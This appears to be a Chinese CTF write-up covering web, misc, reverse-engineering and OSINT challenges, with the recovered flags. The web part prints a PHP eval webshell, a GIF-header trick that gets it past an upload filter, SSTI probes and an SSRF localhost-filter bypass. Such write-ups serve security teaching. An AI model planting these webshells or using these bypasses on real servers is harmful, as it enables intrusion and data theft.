**CONTENT**
- [[#Web|Web]]
	- [[#Web#EZ_SSTI|EZ_SSTI]]
	- [[#Web#Ez_Upload|Ez_Upload]]
	- [[#Web#ezez_ssrf|ezez_ssrf]]
- [[#MISC|MISC]]
	- [[#MISC#base64??|base64??]]
	- [[#MISC#叽里咕噜的在说什么呢|叽里咕噜的在说什么呢]]
	- [[#MISC#来签个到吧|来签个到吧]]
- [[#Re|Re]]
	- [[#Re#checkin|checkin]]
	- [[#Re#ezzzzXor|ezzzzXor]]
- [[#Osint|Osint]]

# Web

## EZ_SSTI

根据提示，POST`嘿7*7嘿`时，得到回显49,证明有ssti  
再利用`嘿7*'7'嘿`，发现有正常回显7777777，确定是jinjia2或者Twig模版  
然后利用python调用os模块，查看根目录，找到有flag文件![](images/Pasted%20image%2020251206142839.png)  
最后cat出来即可![](images/Pasted%20image%2020251206142921.png)  
<mark style="background: #CACFD9A6;">flag{770f642e-bc34-47f5-9a5f-4535251534ef}</mark>

## Ez_Upload

先试着上传一句话木马php文件
```php
<?php
@eval($_POST['shell']);
?>
```
上传后发现只允许上传图片文件，因此利用GIF文件头绕过
```php
GIF89a;
<?php
@eval($_POST['shell']);
?>
```
访问文件存放地址，利用shell直接抓取flag![](images/Pasted%20image%2020251206171557.png)  
<mark style="background: #CACFD9A6;">flag{c8a476aa-cec5-4e0d-ab72-ac234ddeb7f2}</mark>

## ezez_ssrf

```php
<?php  
error_reporting(0);  
highlight_file(__FILE__);  
  
$url = $_POST['url'] ?? null;  
if ($url === null) die("访问本机 8080 端口试试");  
$url_parsed = parse_url($url);  
  
if ($url_parsed['scheme'] === 'http' || $url_parsed['scheme'] === 'https') {  /* $ip = gethostbyname($url_parsed['host']);  
  echo '</br>' . $ip . '</br>'; */  
  
  /* if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {  
    die('不允许的 ip');  
  } */  if (preg_match("/localhost|0/i", $url_parsed["host"])) {  
    die("不允许的主机地址");  
  }  $curl = curl_init($url);  curl_setopt($curl, CURLOPT_HEADER, 0);  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);  $result = curl_exec($curl);  curl_close($curl);  
  
  echo $result;  
} else {  
  die('scheme不正确');  
}
```
分析php代码
1. POST一个url
2. 不允许出现localhost和0的主机名访问
3. 根据提示需要我们以8080端口访问  
 因此我们可以通过127.1绕过主机名过滤（原理：省略部分，默认以0填充）  
 再以本机8080端口访问即可得到flag  
![](images/Pasted%20image%2020251206193110.png)  

<mark style="background: #CACFD9A6;">flag{2ff0d553-9acc-47e2-811f-f76a314b6cd7}</mark>

# MISC

## base64??

根据题目提示为LSB，题目是base64, 而且每行都以占位符=结尾一眼base64隐写啊，直接在线base64隐写网站解码  
![](images/Pasted%20image%2020251206193946.png)

<mark style="background: #CACFD9A6;">flag{wow!Go0d_j@b!!you_D1crypt@base}</mark>

## 叽里咕噜的在说什么呢

经典的锟斤拷错误，一般发生在几个有关中文编码方法互相转换出错，也是在线网站解码![](images/Pasted%20image%2020251206194656.png)  
由于是全角字符，要转换半角字符，但是flag不长啊，直接手打了  
<mark style="background: #CACFD9A6;">flag{you_know_GBK@UTF8!}</mark>

## 来签个到吧

压缩包中的doc文档打不开，改为zip格式，用解压缩软件看，在docProps路径下找到gift  
![](images/Pasted%20image%2020251206091811.png)  
是flag的后段 <mark style="background: #CACFD9A6;">re_Th1ft!}</mark>  
![](images/Pasted%20image%2020251206092000.png)  
在word\media路径下找到image1,其中有flag前段 <mark style="background: #CACFD9A6;">flag{Ice1_Ma</mark>  
![](images/Pasted%20image%2020251206092242.png)  
flag.txt中为中段 <mark style="background: #CACFD9A6;">Gic_Fl@g_N0_M0</mark>  
组合得到完整flag，为 <mark style="background: #CACFD9A6;">flag{Ice1_MaGic_Fl@g_N0_M0re_Th1ft!}</mark>

# Re

## checkin

发现是vbe后缀，查了一下是vbs的一种加密形式，利用在线网站反编译vbe文件为vbs文件  
![](images/Pasted%20image%2020251206195410.png)  
然后vscode看源代码，发现密文和密钥
```vb
targetCipher = "e5aa4f6bbafdb05d106a4911d9c18ff4e0de73f9d58c5a8e07c8764925105fe69855dfc3d24acb15557a45d4e7f12291"

key = "secretkeyisheree"
```
分析密码验证过程，发现对原始flag依次进行了 ROT13 编码，PKCS7 填充，AES加密得到密文。由于本人真的是不会写这些算法的逆向脚本啊，只能ai帮写了😭
```python
from Crypto.Cipher import AES
import binascii

def decrypt_flag():
    target_cipher = "e5aa4f6bbafdb05d106a4911d9c18ff4e0de73f9d58c5a8e07c8764925105fe69855dfc3d24acb15557a45d4e7f12291"
    key = b"secretkeyisheree"
    cipher_bytes = binascii.unhexlify(target_cipher)
    print(f"密文字节长度: {len(cipher_bytes)}")
    cipher = AES.new(key, AES.MODE_ECB)
    try:
        decrypted = cipher.decrypt(cipher_bytes)
        print(f"解密后的原始数据（十六进制）: {binascii.hexlify(decrypted).decode()}")
        print(f"解密后的文本: {decrypted}")
        last_byte = decrypted[-1]
        if 1 <= last_byte <= 16:
            expected_padding = bytes([last_byte] * last_byte)
            if decrypted[-last_byte:] == expected_padding:
                unpadded = decrypted[:-last_byte]
                print(f"去除填充后: {unpadded}")
                def rot13_decode(text_bytes):
                    result = []
                    for byte in text_bytes:
                        char = chr(byte)
                        if 'a' <= char <= 'z':
                            base = ord('a')
                            result.append(chr((byte - base + 13) % 26 + base))
                        elif 'A' <= char <= 'Z':
                            base = ord('A')
                            result.append(chr((byte - base + 13) % 26 + base))
                        else:
                            result.append(char)
                    return ''.join(result)
                rot13_text = unpadded.decode('ascii', errors='ignore')
                print(f"ROT13文本: {rot13_text}")
                original = rot13_decode(unpadded)
                print(f"原始flag: {original}")
                return original
    except Exception as e:
        print(f"解密错误: {e}")
    return None

if __name__ == "__main__":
    decrypt_flag()
```
直接运行得到flag ![](images/Pasted%20image%2020251206113226.png)  
flag为 <mark style="background: #CACFD9A6;">flag{D0_Y0U_KN0VV_V85?-7ry-@9a1n}</mark>

## ezzzzXor

die查壳，发现未加壳，ida查看，先shift+F12看看字符串，看到一个this is right flag![](images/Pasted%20image%2020251206195857.png)  
发现并没有藏flag，那还是老老实实分析main函数吧，F5看伪代码，这些都是有用代码![](images/Pasted%20image%2020251206200036.png)  
前面就是，接收用户输入，删掉末尾"\n"结束符，以输入字符串长度生成随机种子  
接下来分析重点函数sub_140001000  
![](images/Pasted%20image%2020251206200441.png)  
这里就是核心算法了，对flag进行了xor运算后得到的结果与密文对比  
由于rand是伪随机，所以当输入长度相同时，rand输出相同，所以查看密文长度确定![](images/Pasted%20image%2020251206203446.png)  
最后写逆向脚本，伪随机逆向依旧不会写😢，真要写可能要写很久，所以又让ai代写，ai才是真正的大手子orz
```python
import ctypes
import struct

raw_data = [
    0x00000012, 0xFFFFFFBD, 0xFFFFFFDB, 0x00000013,
    0xFFFFFFEE, 0x0000004E, 0x00000048, 0xFFFFFFDD,
    0xFFFFFF97, 0x00000003, 0xFFFFFF8C, 0xFFFFFFB9,
    0xFFFFFF89, 0x00000062, 0xFFFFFFFD, 0xFFFFFF92,
    0x00000011, 0x00000073, 0x00000009, 0xFFFFFFAD,
    0x00000064, 0xFFFFFFDB, 0x00000042, 0xFFFFFFAC
]
  
target_ints = []
for val in raw_data:
    if val & 0x80000000:
        signed_val = val - 0x100000000
    else:
        signed_val = val
    target_ints.append(signed_val)  

length = len(target_ints)
ctypes.cdll.msvcrt.srand(length)

flag = ""
for i in range(length):
    rand_val = ctypes.cdll.msvcrt.rand()
  
    char_val = target_ints[i] & 0xFF
    decrypted = char_val ^ (rand_val & 0xFF)
    flag += chr(decrypted)

print("Flag:", flag)
```
运行得到flag  
Flag: <mark style="background: #CACFD9A6;">flag{x0r_1s_r3@11y_e@2y}</mark>

# Osint

百度识图，找到类似的标志舞台双层圆盘![](images/Pasted%20image%2020251206170216.png)  
找到图片来源，发现服饰也完全符合  
![](images/Pasted%20image%2020251206170243.png)  
搜索相关信息，提交flag![](images/Pasted%20image%2020251206170343.png)  
<mark style="background: #CACFD9A6;">flag{2025_10_18_陈粒_南京_一粒十周年演唱会}</mark>
